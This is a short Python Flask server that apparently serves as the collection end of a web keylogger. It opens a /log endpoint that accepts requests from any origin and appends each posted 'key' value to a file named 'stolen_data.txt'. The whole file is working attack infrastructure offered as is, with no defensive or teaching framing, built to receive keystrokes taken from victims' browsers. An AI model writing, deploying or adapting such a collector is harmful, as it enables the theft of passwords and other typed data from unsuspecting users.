from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/log", methods=["OPTIONS"])
def preflight():
    response = jsonify(success=True)
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
    response.headers.add("Access-Control-Allow-Headers", "Content-Type")
    return response

@app.route("/log", methods=["POST"])
def log_key():
    data = request.json
    if data and "key" in data:
        print(f"Key: {data['key']}")
        with open("stolen_data.txt", "a") as f:
            f.write(f"{data['key']} ")
    return "", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)

